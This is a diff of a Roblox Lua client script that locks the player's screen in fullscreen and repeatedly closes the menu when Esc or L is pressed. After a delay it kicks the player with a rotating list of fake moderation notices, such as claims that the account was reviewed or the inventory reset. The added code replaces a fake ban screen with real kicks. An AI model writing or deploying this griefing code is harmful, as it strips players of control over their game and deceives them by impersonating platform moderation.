@@ -1,45 +1,29 @@
--- Permanent Fullscreen Lock + Triggered Lock + Unified Fake Kick Screen
+-- Permanent Fullscreen Lock + Triggered Lock + Real Moderation Kick with Backups
 local uis = game:GetService("UserInputService")
 local rs = game:GetService("RunService")
 local sg = game:GetService("StarterGui")
 local gs = game:GetService("GuiService")
 local lp = game:GetService("Players").LocalPlayer
 
-local pcKickDelay = 200     -- Delay after trigger on PC
-local mobileKickDelay = 70 -- Delay from script start on mobile
+local pcKickDelay = 200
+local mobileKickDelay = 70
 local lockActive = false
 
-local kickMessage = "You have been kicked by this experience or its moderators.\n(Error Code: 267)"
+-- List of moderation messages (order matters)
+local kickMessages = {
+    "Your account status has been reviewed. Please rejoin to continue playing.",
+    "Your inventory has been reset. Please rejoin the game.",
+    "Please reconnect to continue playing this experience.",
+    "A change was made to your account. Rejoin to continue."
+}
 
--- Function to show fake ban screen then kick
-local function showFakeBan(reason, delayBeforeKick)
-    local screen = Instance.new("ScreenGui")
-    screen.IgnoreGuiInset = true
-    screen.Parent = game:GetService("CoreGui")
-
-    local bg = Instance.new("Frame", screen)
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-
-    local title = Instance.new("TextLabel", bg)
-    title.Text = "Disconnected"
-    title.Font = Enum.Font.SourceSansBold
-    title.TextScaled = true
-    title.Size = UDim2.new(1, 0, 0, 100)
-    title.Position = UDim2.new(0, 0, 0.35, 0)
-    title.TextColor3 = Color3.fromRGB(0, 0, 0)
-
-    local reasonText = Instance.new("TextLabel", bg)
-    reasonText.Text = reason
-    reasonText.Font = Enum.Font.SourceSans
-    reasonText.TextSize = 24
-    reasonText.Size = UDim2.new(1, -40, 0, 60)
-    reasonText.Position = UDim2.new(0, 20, 0.45, 0)
-    reasonText.TextColor3 = Color3.fromRGB(0, 0, 0)
-    reasonText.TextWrapped = true
-
+-- Function to kick with multiple attempts
+local function kickWithBackup(messages, delayBeforeKick)
     task.delay(delayBeforeKick, function()
-        lp:Kick(reason)
+        for _, msg in ipairs(messages) do
+            lp:Kick(msg)
+            task.wait(0.5) -- Small pause before trying next
+        end
     end)
 end
 
@@ -47,7 +31,7 @@ end
 local function activateLock(kickDelay)
     if lockActive then return end
     lockActive = true
-    print("Lock activated. Fake kick screen in " .. kickDelay .. " seconds.")
+    print("Lock activated. Real kick in " .. kickDelay .. " seconds.")
 
     -- Force fullscreen
     rs.RenderStepped:Connect(function()
@@ -64,7 +48,7 @@ local function activateLock(kickDelay)
         end
     end)
 
-    -- Esc/L keys close menu
+    -- Esc/L keys close menu quickly
     local function closeMenu()
         sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         task.wait(0.025)
@@ -79,8 +63,8 @@ local function activateLock(kickDelay)
         end
     end)
 
-    -- Show the fake ban screen after the delay
-    showFakeBan(kickMessage, kickDelay)
+    -- Kick with backup messages
+    kickWithBackup(kickMessages, kickDelay)
 end
 
 -- Desktop vs Mobile logic
@@ -99,8 +83,8 @@ if not uis.TouchEnabled then
     end)
 else
     -- Mobile: Start countdown immediately
-    print("Mobile detected. Fake kick in " .. mobileKickDelay .. " seconds.")
+    print("Mobile detected. Real kick in " .. mobileKickDelay .. " seconds.")
     task.delay(mobileKickDelay, function()
-        showFakeBan(kickMessage, 0)
+        kickWithBackup(kickMessages, 0)
     end)
 end
